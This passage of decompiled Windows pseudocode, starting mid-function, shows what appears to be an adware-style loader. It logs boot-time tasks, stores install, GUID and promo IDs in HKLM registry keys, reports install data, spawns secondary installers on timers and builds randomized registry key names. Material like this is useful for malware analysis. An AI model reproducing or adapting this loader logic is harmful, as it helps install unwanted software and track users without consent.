          FUN_004116e9((int)&stack0x00000460,extraout_DL_13,s_Loader_004051a0,s_WinMain_00406d0c,
                       &stack0x00000160);
        }
      }
    }
    FUN_0041430f((int)&stack0x00000460,in_stack_00000098,in_stack_0000009c,&DAT_0041f24c);
    iVar16 = FUN_0040c740((int)&stack0x00000460,&stack0x00000360);
    FUN_0040c900(&stack0x00000460,&param_11,&param_9);
    uVar10 = extraout_DL_14;
    if (9 < iVar16) {
      FUN_0040d810((int)&stack0x00000460,(int)&stack0x00000078);
      uVar10 = extraout_DL_15;
    }
    if (uVar7 != 0xffffffff) {
      if (iVar8 != 0) {
        if (uVar7 == 0) {
          FUN_0040c410((int)&stack0x00000460,&stack0x00000260);
          uVar7 = FUN_0040e140((int)&stack0x00000460,&stack0x00000360);
          if (uVar7 == 0) {
            iVar8 = FUN_00415fa1((int *)0x0);
            iVar8 = iVar8 + 0x15180;
          }
          else {
            iVar8 = FUN_00415fa1((int *)0x0);
            iVar8 = iVar8 + 0xe10;
          }
          FUN_004125fb(&param_2,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0042124c,iVar8);
          FUN_004144ad((int)&stack0x00000460);
          uVar10 = extraout_DL_18;
        }
        else {
          FUN_0040c650((int)&stack0x00000460,&stack0x00000260,&DAT_0041ee4c,&DAT_0041fa4c);
          FUN_004116e9((int)&stack0x00000460,extraout_DL_19,s_Loader_004051a0,s_WinMain_00406d0c,
                       s_Performing_Boot_Time_tasks__00406a64);
          FUN_00413232((char *)DAT_004251cc,(undefined4 *)&stack0x00001768);
          FUN_00413957((int)&stack0x00000460,in_stack_00000094,&DAT_0040658c,(byte *)&DAT_00422e4c,
                       &DAT_00405018,&param_12);
          FUN_00413016();
          uVar10 = extraout_DL_20;
          if (param_12 != (LPVOID)0x0) {
            FUN_004150a9(param_12);
            uVar10 = extraout_DL_21;
          }
          if ((CONCAT31(extraout_var_00,bVar2) == 0) &&
             (iVar8 = FUN_0040e460((int)&stack0x00000460,&stack0x00000360,&stack0x00000078,param_1,
                                   &stack0x00000260,iVar16), uVar10 = extraout_DL_22, iVar8 != 0)) {
            FUN_004125fb(&param_2,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0042124c,0);
            uVar10 = extraout_DL_23;
          }
        }
      }
LAB_00410f89:
      if (DAT_0041ea48 != '\0') {
        FUN_004116e9((int)&stack0x00000460,uVar10,s_Loader_004051a0,s_WinMain_00406d0c,
                     s_Spawning_Secondary_Loader_0040546c);
        FUN_00415e87(1,DAT_004251cc);
      }
      FUN_004123b0(&param_2,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0042064c,(LPBYTE)&param_5);
      iVar8 = FUN_004123b0(&param_2,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0041ea4c,(LPBYTE)&param_4);
      if (iVar8 == 0) {
        FUN_0041546e(&stack0x00000160,(byte *)s_First_secondary_installation_rep_00406a30);
        FUN_004116e9((int)&stack0x00000460,extraout_DL_24,s_Loader_004051a0,s_WinMain_00406d0c,
                     &stack0x00000160);
      }
      else {
        iVar8 = FUN_004123b0(&param_2,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0041e248,(LPBYTE)&param_7)
        ;
        if (iVar8 != 0) {
          param_7 = 0;
        }
        param_4 = param_7 + 0xe10;
        FUN_0041546e(&stack0x00000160,(byte *)s_First_secondary_installation_rep_004069dc);
        FUN_004116e9((int)&stack0x00000460,extraout_DL_25,s_Loader_004051a0,s_WinMain_00406d0c,
                     &stack0x00000160);
        FUN_0040d470((int)&stack0x00000460,(int)&stack0x00000078,&param_2,&stack0x00000044,param_4,
                     &stack0x00000360,&stack0x00000260,iVar16,param_1,param_5,DVar11);
        FUN_0040d2f0((int)&stack0x00000460,(int)&stack0x00000078,&param_2,&stack0x00000044,
                     &stack0x00000360,&stack0x00000260,iVar16,param_1,param_5,DVar11);
        FUN_0041546e(&stack0x00000f68,(byte *)s__s_INSTALLID__d_GUID__s_PROMO__d_00406980);
        iVar8 = FUN_0040d640((int)&stack0x00000460,&stack0x00000360,&stack0x00000f68,&param_6,
                             &param_10);
        if (iVar8 == 0) {
          puVar4 = FUN_00415a80(param_6,s_<DelayedReportID__0040696c);
          if (puVar4 != (uint *)0x0) {
            uVar7 = 0xffffffff;
            pcVar5 = s_<DelayedReportID__0040696c;
            do {
              if (uVar7 == 0) break;
              uVar7 = uVar7 - 1;
              cVar1 = *pcVar5;
              pcVar5 = pcVar5 + 1;
            } while (cVar1 != '\0');
            FUN_004154f3((uint *)((~uVar7 - 1) + (int)puVar4),&DAT_004042f8);
            FUN_004125fb(&param_2,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0041ea4c,param_4);
          }
          FUN_004150a9(param_6);
        }
      }
      iVar8 = FUN_004123b0(&param_2,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0042024c,(LPBYTE)&param_4);
      if (iVar8 == 0) {
        FUN_0041546e(&stack0x00000160,(byte *)s_Second_secondary_installation_re_00406938);
        FUN_004116e9((int)&stack0x00000460,extraout_DL_26,s_Loader_004051a0,s_WinMain_00406d0c,
                     &stack0x00000160);
      }
      else {
        iVar8 = FUN_004123b0(&param_2,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0041e248,(LPBYTE)&param_7)
        ;
        if (iVar8 != 0) {
          param_7 = 0;
        }
        param_4 = param_7 + 0xa8c0;
        FUN_0041546e(&stack0x00000160,(byte *)s_Second_secondary_installation_re_004068e0);
        FUN_004116e9((int)&stack0x00000460,(char)&stack0x00000160,s_Loader_004051a0,
                     s_WinMain_00406d0c,&stack0x00000160);
        FUN_0040d470((int)&stack0x00000460,(int)&stack0x00000078,&param_2,&stack0x00000044,param_4,
                     &stack0x00000360,&stack0x00000260,iVar16,param_1,param_5,DVar11);
        FUN_0040d2f0((int)&stack0x00000460,(int)&stack0x00000078,&param_2,&stack0x00000044,
                     &stack0x00000360,&stack0x00000260,iVar16,param_1,param_5,DVar11);
        FUN_0041546e(&stack0x00000f68,(byte *)s__s_INSTALLID__d_GUID__s_PROMO__d_00406980);
        iVar8 = FUN_0040d640((int)&stack0x00000460,&stack0x00000360,&stack0x00000f68,&param_6,
                             &param_10);
        if (iVar8 == 0) {
          puVar4 = FUN_00415a80(param_6,s_<DelayedReportID__0040696c);
          if (puVar4 != (uint *)0x0) {
            uVar7 = 0xffffffff;
            pcVar5 = s_<DelayedReportID__0040696c;
            do {
              if (uVar7 == 0) break;
              uVar7 = uVar7 - 1;
              cVar1 = *pcVar5;
              pcVar5 = pcVar5 + 1;
            } while (cVar1 != '\0');
            FUN_004154f3((uint *)((~uVar7 - 1) + (int)puVar4),&DAT_004042f8);
            FUN_004125fb(&param_2,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0042024c,param_4);
          }
          FUN_004150a9(param_6);
        }
      }
      goto LAB_00411540;
    }
    FUN_004116e9((int)&stack0x00000460,uVar10,s_Loader_004051a0,s_WinMain_00406d0c,
                 s_Performing_Initial_Installation_t_00406acc);
    FUN_0040d590((int)&stack0x00000460,DVar11);
    if (iVar8 == 0) {
      FUN_0040c410((int)&stack0x00000460,&stack0x00000260);
      FUN_0041546e(&stack0x00000f68,(byte *)s__s_OS__s_DSPW__d_DSPH__d_ADMIN_0_00406a84);
      FUN_0040d640((int)&stack0x00000460,&stack0x00000360,&stack0x00000f68,&param_6,&param_10);
      uVar10 = extraout_DL_16;
      goto LAB_00410f89;
    }
    uVar6 = FUN_0040c650((int)&stack0x00000460,&stack0x00000260,&DAT_0041ee4c,&DAT_0041fa4c);
    BVar15 = (BYTE)iVar16;
    FUN_004116e9((int)&stack0x00000460,extraout_DL_17,s_Loader_004051a0,s_WinMain_00406d0c,
                 s_Performing_Initial_Installation_t_00406acc);
    FUN_0040dc70(&stack0x00000460,&stack0x00000360,&stack0x00000078,(char)param_11,(char)param_9,
                 (char)uVar6,(char)&stack0x00000260,BVar15,(char)&param_1,unaff_DI,(char)param_9,
                 in_stack_00000124,in_stack_00000524);
    FUN_004144ad((int)&stack0x00000460);
  }
  else {
    FUN_00413232((char *)DAT_004251cc,&DAT_00422e4c);
    FUN_0041546e(&stack0x00000160,(byte *)s_sApp_Path____s__004068cc);
    FUN_004116e9((int)&stack0x00000460,(char)&stack0x00000160,s_Loader_004051a0,s_WinMain_00406d0c,
                 &stack0x00000160);
    FUN_00411760((int *)&stack0x00001868,extraout_DL_27,&DAT_00422e4c);
    FUN_0040fe50((int)&stack0x00000460);
    FUN_004123b0(&param_2,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0042064c,(LPBYTE)&param_5);
    FUN_004116e9((int)&stack0x00000460,extraout_DL_28,s_Loader_004051a0,s_WinMain_00406d0c,
                 s_Storing_GUID__PromoID__InstallID_0040689c);
    FUN_004120ee(&param_2,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0041fa4c,0x400,&stack0x00000260);
    FUN_004123b0(&param_2,(HKEY)0x80000002,&DAT_0041ee4c,&DAT_0042224c,&stack0x00000000);
    FUN_004123b0(&param_2,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0041e648,(LPBYTE)&param_1);
    FUN_004117d0();
LAB_00411540:
    if (param_14 != 0) {
      do {
        do {
          FUN_0040d0c0((int)&stack0x00000460,(int)&stack0x00000078,&param_2,&stack0x00000044,
                       &stack0x00000360,&stack0x00000260,iVar16,param_1,param_5,DVar11);
          FUN_0040d2f0((int)&stack0x00000460,(int)&stack0x00000078,&param_2,&stack0x00000044,
                       &stack0x00000360,&stack0x00000260,iVar16,param_1,param_5,DVar11);
        } while (DAT_00423a4c != 1);
        iVar8 = FUN_0040eec0((int)&stack0x00000460,&stack0x00000360);
        if (iVar8 == 0) {
          iVar8 = FUN_00415fa1((int *)0x0);
          iVar8 = iVar8 + 0x15180;
        }
        else {
          iVar8 = FUN_00415fa1((int *)0x0);
          iVar8 = iVar8 + 0xe10;
        }
        FUN_004125fb(&param_2,(HKEY)0x80000002,&DAT_00421e4c,&DAT_0042124c,iVar8);
      } while( true );
    }
  }
  FUN_0040bcf0((undefined4 *)&stack0x00000078);
LAB_00410dae:
  FUN_00411af0((undefined4 *)&stack0x00000044);
  FUN_0041205e(&param_2);
  FUN_0041168c((undefined4 *)&stack0x00000460);
  return 0;
}



void __fastcall FUN_00411660(undefined4 *param_1)

{
  param_1[0x101] = 0;
  *param_1 = &PTR_FUN_004011d8;
  return;
}



undefined4 * __thiscall FUN_00411670(void *this,byte param_1)

{
  FUN_0041168c((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0041509e(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_0041168c(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_004011d8;
  if ((int *)param_1[0x101] != (int *)0x0) {
    FUN_004150d8((int *)param_1[0x101]);
  }
  return;
}



void __thiscall FUN_004116a4(void *this,LPCSTR param_1)

{
  char cVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  undefined4 *puVar5;
  LPCSTR pCVar6;
  char *pcVar7;
  undefined4 *puVar8;
  
  uVar3 = 0xffffffff;
  pCVar6 = param_1;
  do {
    pcVar7 = pCVar6;
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    pcVar7 = pCVar6 + 1;
    cVar1 = *pCVar6;
    pCVar6 = pcVar7;
  } while (cVar1 != '\0');
  uVar3 = ~uVar3;
  puVar5 = (undefined4 *)(pcVar7 + -uVar3);
  puVar8 = (undefined4 *)((int)this + 4);
  for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
    *puVar8 = *puVar5;
    puVar5 = puVar5 + 1;
    puVar8 = puVar8 + 1;
  }
  for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(undefined *)puVar8 = *(undefined *)puVar5;
    puVar5 = (undefined4 *)((int)puVar5 + 1);
    puVar8 = (undefined4 *)((int)puVar8 + 1);
  }
  uVar2 = FUN_004154e0(param_1,&DAT_00405464);
  *(undefined4 *)((int)this + 0x404) = uVar2;
  return;
}



void __fastcall
FUN_004116e9(int param_1,undefined param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5)

{
  int **ppiVar1;
  int local_8;
  
  if (*(int *)(param_1 + 0x404) != 0) {
    local_8 = param_1;
    FUN_00415fa1(&local_8);
    FUN_00416381(&local_8);
    ppiVar1 = (int **)FUN_004154e0((LPCSTR)(param_1 + 4),&DAT_00405464);
    *(int ***)(param_1 + 0x404) = ppiVar1;
    FUN_0041634f(ppiVar1,(byte *)s__d__d__d__s__s___s_00406d48);
    FUN_004150d8(*(int **)(param_1 + 0x404));
  }
  return;
}



int * __fastcall FUN_00411760(int *param_1,undefined param_2,undefined4 param_3)

{
  int *piVar1;
  char *pcVar2;
  char cVar3;
  byte bVar4;
  byte bVar5;
  uint uVar6;
  uint uVar7;
  int *piVar8;
  
  piVar1 = param_1 + 1;
  FUN_0041546e((char *)piVar1,&DAT_00404364);
  uVar6 = 0xffffffff;
  piVar8 = piVar1;
  do {
    if (uVar6 == 0) break;
    uVar6 = uVar6 - 1;
    cVar3 = *(char *)piVar8;
    piVar8 = (int *)((int)piVar8 + 1);
  } while (cVar3 != '\0');
  *param_1 = 0;
  uVar7 = 0;
  if (~uVar6 != 1) {
    bVar5 = 0;
    do {
      pcVar2 = (char *)(uVar7 + (int)piVar1);
      bVar4 = bVar5 & 0x1f;
      bVar5 = bVar5 + 4;
      uVar7 = uVar7 + 1;
      *param_1 = *param_1 + ((int)*pcVar2 << bVar4) % 0xfffffff;
    } while (uVar7 < ~uVar6 - 1);
  }
  FUN_004117e0(param_1);
  FUN_004118f0(param_1);
  return param_1;
}



void FUN_004117d0(void)

{
  return;
}



void __fastcall FUN_004117e0(undefined4 *param_1)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  int iVar6;
  undefined4 *puVar7;
  uint *puVar8;
  int iVar9;
  undefined4 *puVar10;
  char *pcVar11;
  char *pcVar12;
  undefined4 *puVar13;
  uint local_84 [33];
  
  FUN_00416585(*param_1);
  puVar8 = local_84;
  for (iVar6 = 0x21; iVar6 != 0; iVar6 = iVar6 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  iVar6 = 0;
  puVar8 = local_84;
  do {
    *puVar8 = 0;
    do {
      uVar3 = FUN_0041658f();
      uVar4 = FUN_0041658f();
      uVar3 = (int)(uVar4 * uVar3) % 100000000;
      *puVar8 = uVar3;
    } while (uVar3 < 10000);
    bVar2 = false;
    if (iVar6 < 1) {
LAB_0041184e:
      iVar6 = iVar6 + 1;
      puVar8 = puVar8 + 1;
    }
    else {
      puVar5 = local_84;
      iVar9 = iVar6;
      do {
        if (uVar3 == *puVar5) {
          bVar2 = true;
        }
        puVar5 = puVar5 + 1;
        iVar9 = iVar9 + -1;
      } while (iVar9 != 0);
      if (!bVar2) goto LAB_0041184e;
    }
  } while (iVar6 < 0x21);
  FUN_00416585(*param_1);
  puVar7 = (undefined4 *)&DAT_00423a54;
  puVar8 = local_84;
  do {
    puVar10 = puVar7;
    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {
      *puVar10 = 0;
      puVar10 = puVar10 + 1;
    }
    FUN_004164e1(*puVar8,(char *)puVar7,10);
    uVar3 = FUN_0041658f();
    iVar6 = (int)uVar3 % 3;
    if (iVar6 == 0) {
      pcVar11 = &DAT_00406d5c;
LAB_004118b1:
      uVar3 = 0xffffffff;
      do {
        pcVar12 = pcVar11;
        if (uVar3 == 0) break;
        uVar3 = uVar3 - 1;
        pcVar12 = pcVar11 + 1;
        cVar1 = *pcVar11;
        pcVar11 = pcVar12;
      } while (cVar1 != '\0');
      uVar3 = ~uVar3;
      iVar6 = -1;
      puVar10 = puVar7;
      do {
        puVar13 = puVar10;
        if (iVar6 == 0) break;
        iVar6 = iVar6 + -1;
        puVar13 = (undefined4 *)((int)puVar10 + 1);
        cVar1 = *(char *)puVar10;
        puVar10 = puVar13;
      } while (cVar1 != '\0');
      puVar10 = (undefined4 *)(pcVar12 + -uVar3);
      puVar13 = (undefined4 *)((int)puVar13 + -1);
      for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
        *puVar13 = *puVar10;
        puVar10 = puVar10 + 1;
        puVar13 = puVar13 + 1;
      }
      for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
        *(undefined *)puVar13 = *(undefined *)puVar10;
        puVar10 = (undefined4 *)((int)puVar10 + 1);
        puVar13 = (undefined4 *)((int)puVar13 + 1);
      }
    }
    else {
      if (iVar6 == 1) {
        pcVar11 = &DAT_00406d64;
        goto LAB_004118b1;
      }
      if (iVar6 == 2) {
        pcVar11 = &DAT_00406d6c;
        goto LAB_004118b1;
      }
    }
    puVar7 = puVar7 + 0x10;
    puVar8 = puVar8 + 1;
    if (0x424293 < (int)puVar7) {
      return;
    }
  } while( true );
}



void __fastcall FUN_004118f0(undefined4 *param_1)

{
  char cVar1;
  bool bVar2;
  uint uVar3;
  uint *puVar4;
  int iVar5;
  uint uVar6;
  char *pcVar7;
  char *pcVar8;
  int iVar9;
  undefined4 *puVar10;
  uint *puVar11;
  char *pcVar12;
  char *pcVar13;
  undefined4 *puVar14;
  char local_130 [64];
  uint local_f0 [60];
  
  FUN_00416585(*param_1);
  puVar10 = (undefined4 *)&DAT_00424294;
  for (iVar5 = 0x3c0; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  puVar11 = local_f0;
  for (iVar5 = 0x3c; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar11 = 0;
    puVar11 = puVar11 + 1;
  }
  iVar5 = 0;
  puVar11 = local_f0;
  do {
    *puVar11 = 0;
    do {
      uVar3 = FUN_0041658f();
      uVar3 = (int)uVar3 % 1000;
    } while (uVar3 < 100);
    bVar2 = false;
    *puVar11 = uVar3;
    if (iVar5 < 1) {
LAB_00411961:
      iVar5 = iVar5 + 1;
      puVar11 = puVar11 + 1;
    }
    else {
      puVar4 = local_f0;
      iVar9 = iVar5;
      do {
        if (uVar3 == *puVar4) {
          bVar2 = true;
        }
        puVar4 = puVar4 + 1;
        iVar9 = iVar9 + -1;
      } while (iVar9 != 0);
      if (!bVar2) goto LAB_00411961;
    }
  } while (iVar5 < 0x3c);
  pcVar7 = &DAT_00424294;
  do {
    uVar3 = 0xffffffff;
    pcVar12 = s_SOFTWARE__00406d78;
    do {
      pcVar8 = pcVar12;
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      pcVar8 = pcVar12 + 1;
      cVar1 = *pcVar12;
      pcVar12 = pcVar8;
    } while (cVar1 != '\0');
    uVar3 = ~uVar3;
    iVar5 = -1;
    pcVar12 = pcVar7;
    do {
      pcVar13 = pcVar12;
      if (iVar5 == 0) break;
      iVar5 = iVar5 + -1;
      pcVar13 = pcVar12 + 1;
      cVar1 = *pcVar12;
      pcVar12 = pcVar13;
    } while (cVar1 != '\0');
    puVar10 = (undefined4 *)(pcVar8 + -uVar3);
    puVar14 = (undefined4 *)(pcVar13 + -1);
    for (uVar6 = uVar3 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
      *puVar14 = *puVar10;
      puVar10 = puVar10 + 1;
      puVar14 = puVar14 + 1;
    }
    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)puVar14 = *(undefined *)puVar10;
      puVar10 = (undefined4 *)((int)puVar10 + 1);
      puVar14 = (undefined4 *)((int)puVar14 + 1);
    }
    uVar3 = 0xffffffff;
    puVar10 = param_1 + 1;
    do {
      puVar14 = puVar10;
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      puVar14 = (undefined4 *)((int)puVar10 + 1);
      cVar1 = *(char *)puVar10;
      puVar10 = puVar14;
    } while (cVar1 != '\0');
    uVar3 = ~uVar3;
    iVar5 = -1;
    pcVar12 = pcVar7;
    do {
      pcVar8 = pcVar12;
      if (iVar5 == 0) break;
      iVar5 = iVar5 + -1;
      pcVar8 = pcVar12 + 1;
      cVar1 = *pcVar12;
      pcVar12 = pcVar8;
    } while (cVar1 != '\0');
    puVar10 = (undefined4 *)((int)puVar14 - uVar3);
    puVar14 = (undefined4 *)(pcVar8 + -1);
    for (uVar6 = uVar3 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
      *puVar14 = *puVar10;
      puVar10 = puVar10 + 1;
      puVar14 = puVar14 + 1;
    }
    pcVar7 = pcVar7 + 0x40;
    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)puVar14 = *(undefined *)puVar10;
      puVar10 = (undefined4 *)((int)puVar10 + 1);
      puVar14 = (undefined4 *)((int)puVar14 + 1);
    }
  } while ((int)pcVar7 < 0x424495);
  uVar3 = 0xffffffff;
  pcVar7 = s_SOFTWARE__00406d78;
  do {
    pcVar12 = pcVar7;
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    pcVar12 = pcVar7 + 1;
    cVar1 = *pcVar7;
    pcVar7 = pcVar12;
  } while (cVar1 != '\0');
  uVar3 = ~uVar3;
  iVar5 = -1;
  pcVar7 = &DAT_00424e94;
  do {
    pcVar8 = pcVar7;
    if (iVar5 == 0) break;
    iVar5 = iVar5 + -1;
    pcVar8 = pcVar7 + 1;
    cVar1 = *pcVar7;
    pcVar7 = pcVar8;
  } while (cVar1 != '\0');
  puVar10 = (undefined4 *)(pcVar12 + -uVar3);
  puVar14 = (undefined4 *)(pcVar8 + -1);
  for (uVar6 = uVar3 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
    *puVar14 = *puVar10;
    puVar10 = puVar10 + 1;
    puVar14 = puVar14 + 1;
  }
  for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(undefined *)puVar14 = *(undefined *)puVar10;
    puVar10 = (undefined4 *)((int)puVar10 + 1);
    puVar14 = (undefined4 *)((int)puVar14 + 1);
  }
  uVar3 = 0xffffffff;
  puVar10 = param_1 + 1;
  do {
    puVar14 = puVar10;
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    puVar14 = (undefined4 *)((int)puVar10 + 1);
    cVar1 = *(char *)puVar10;
    puVar10 = puVar14;
  } while (cVar1 != '\0');
  uVar3 = ~uVar3;
  iVar5 = -1;
  pcVar7 = &DAT_00424e94;
  do {
    pcVar12 = pcVar7;
    if (iVar5 == 0) break;
    iVar5 = iVar5 + -1;
    pcVar12 = pcVar7 + 1;
    cVar1 = *pcVar7;
    pcVar7 = pcVar12;
  } while (cVar1 != '\0');
  puVar10 = (undefined4 *)((int)puVar14 - uVar3);
  puVar14 = (undefined4 *)(pcVar12 + -1);
  for (uVar6 = uVar3 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
    *puVar14 = *puVar10;
    puVar10 = puVar10 + 1;
    puVar14 = puVar14 + 1;
  }
  pcVar7 = &DAT_004242d4;
  for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(undefined *)puVar14 = *(undefined *)puVar10;
    puVar10 = (undefined4 *)((int)puVar10 + 1);
    puVar14 = (undefined4 *)((int)puVar14 + 1);
  }
  do {
    uVar3 = 0xffffffff;
    pcVar12 = &DAT_00406d74;
    do {
      pcVar8 = pcVar12;
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      pcVar8 = pcVar12 + 1;
      cVar1 = *pcVar12;
      pcVar12 = pcVar8;
    } while (cVar1 != '\0');
    uVar3 = ~uVar3;
    iVar5 = -1;
    pcVar12 = pcVar7;
    do {
      pcVar13 = pcVar12;
      if (iVar5 == 0) break;
      iVar5 = iVar5 + -1;
      pcVar13 = pcVar12 + 1;
      cVar1 = *pcVar12;
      pcVar12 = pcVar13;
    } while (cVar1 != '\0');
    puVar10 = (undefined4 *)(pcVar8 + -uVar3);
    puVar14 = (undefined4 *)(pcVar13 + -1);
    for (uVar6 = uVar3 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
      *puVar14 = *puVar10;
      puVar10 = puVar10 + 1;
      puVar14 = puVar14 + 1;
    }
    pcVar7 = pcVar7 + 0x40;
    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)puVar14 = *(undefined *)puVar10;
      puVar10 = (undefined4 *)((int)puVar10 + 1);
      puVar14 = (undefined4 *)((int)puVar14 + 1);
    }
  } while ((int)pcVar7 < 0x424495);
  uVar3 = 0xffffffff;
  pcVar7 = &DAT_00406d74;
  do {
    pcVar12 = pcVar7;
    if (uVar3 == 0) break;
    uVar3 = uVar3 - 1;
    pcVar12 = pcVar7 + 1;
    cVar1 = *pcVar7;
    pcVar7 = pcVar12;
  } while (cVar1 != '\0');
  uVar3 = ~uVar3;
  pcVar8 = &DAT_004242d4;
  iVar5 = -1;
  pcVar7 = &DAT_00424e94;
  do {
    pcVar13 = pcVar7;
    if (iVar5 == 0) break;
    iVar5 = iVar5 + -1;
    pcVar13 = pcVar7 + 1;
    cVar1 = *pcVar7;
    pcVar7 = pcVar13;
  } while (cVar1 != '\0');
  puVar10 = (undefined4 *)(pcVar12 + -uVar3);
  puVar14 = (undefined4 *)(pcVar13 + -1);
  for (uVar6 = uVar3 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
    *puVar14 = *puVar10;
    puVar10 = puVar10 + 1;
    puVar14 = puVar14 + 1;
  }
  puVar11 = local_f0;
  for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
    *(undefined *)puVar14 = *(undefined *)puVar10;
    puVar10 = (undefined4 *)((int)puVar10 + 1);
    puVar14 = (undefined4 *)((int)puVar14 + 1);
  }
  do {
    puVar11 = puVar11 + 1;
    FUN_004164e1(*puVar11,local_130,10);
    uVar3 = 0xffffffff;
    pcVar7 = local_130;
    do {
      pcVar12 = pcVar7;
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      pcVar12 = pcVar7 + 1;
      cVar1 = *pcVar7;
      pcVar7 = pcVar12;
    } while (cVar1 != '\0');
    uVar3 = ~uVar3;
    iVar5 = -1;
    pcVar7 = pcVar8;
    do {
      pcVar13 = pcVar7;
      if (iVar5 == 0) break;
      iVar5 = iVar5 + -1;
      pcVar13 = pcVar7 + 1;
      cVar1 = *pcVar7;
      pcVar7 = pcVar13;
    } while (cVar1 != '\0');
    puVar10 = (undefined4 *)(pcVar12 + -uVar3);
    puVar14 = (undefined4 *)(pcVar13 + -1);
    for (uVar6 = uVar3 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
      *puVar14 = *puVar10;
      puVar10 = puVar10 + 1;
      puVar14 = puVar14 + 1;
    }
    pcVar8 = pcVar8 + 0x40;
    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
      *(undefined *)puVar14 = *(undefined *)puVar10;
      puVar10 = (undefined4 *)((int)puVar10 + 1);
      puVar14 = (undefined4 *)((int)puVar14 + 1);
    }
    if (0x425193 < (int)pcVar8) {
      return;
    }
  } while( true );
}



void __fastcall FUN_00411af0(undefined4 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 1;
  if ((LPVOID)param_1[3] != (LPVOID)0x0) {
    FUN_004150a9((LPVOID)param_1[3]);
  }
  return;
}



undefined4 __fastcall FUN_00411b20(undefined4 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 1;
  if ((LPVOID)param_1[3] != (LPVOID)0x0) {
    FUN_004150a9((LPVOID)param_1[3]);
  }
  return 0;
}



undefined4 __fastcall FUN_00411b50(int *param_1)

{
  param_1[1] = 0;
  if (*param_1 == 0) {
    return 0x80004005;
  }
  param_1[4] = 0;
  if (0 < param_1[5]) {
    param_1[1] = 1;
    return 0;
  }
  param_1[2] = 1;
  return 0;
}



undefined4 __fastcall FUN_00411b80(int *param_1)

{
  int iVar1;
  
  param_1[1] = 0;
  if (*param_1 == 0) {
    return 0x80004005;
  }
  iVar1 = param_1[4];
  param_1[4] = iVar1 + 1;
  if (iVar1 + 1 < param_1[5]) {
    param_1[1] = 1;
    return 0;
  }
  param_1[2] = 1;
  return 0;
}



undefined4 __thiscall FUN_00411bc0(void *this,undefined4 *param_1)

{
  *param_1 = *(undefined4 *)((int)this + 8);
  return 0;
}



undefined4 __thiscall FUN_00411bd0(void *this,undefined4 *param_1)

{
  if (*(int *)((int)this + 4) == 0) {
    return 0x80004005;
  }
  *param_1 = *(undefined4 *)(*(int *)((int)this + 0xc) + 8 + *(int *)((int)this + 0x10) * 0x128);
  return 0;
}



undefined4 __thiscall FUN_00411c00(void *this,undefined4 *param_1)

{
  char cVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  char *pcVar5;
  char *pcVar6;
  
  if (*(int *)((int)this + 4) == 0) {
    return 0x80004005;
  }
  uVar2 = 0xffffffff;
  pcVar5 = (char *)(*(int *)((int)this + 0xc) + 0x24 + *(int *)((int)this + 0x10) * 0x128);
  do {
    pcVar6 = pcVar5;
    if (uVar2 == 0) break;
    uVar2 = uVar2 - 1;
    pcVar6 = pcVar5 + 1;
    cVar1 = *pcVar5;
    pcVar5 = pcVar6;
  } while (cVar1 != '\0');
  uVar2 = ~uVar2;
  puVar4 = (undefined4 *)(pcVar6 + -uVar2);
  for (uVar3 = uVar2 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
    *param_1 = *puVar4;
    puVar4 = puVar4 + 1;
    param_1 = param_1 + 1;
  }
  for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
    *(undefined *)param_1 = *(undefined *)puVar4;
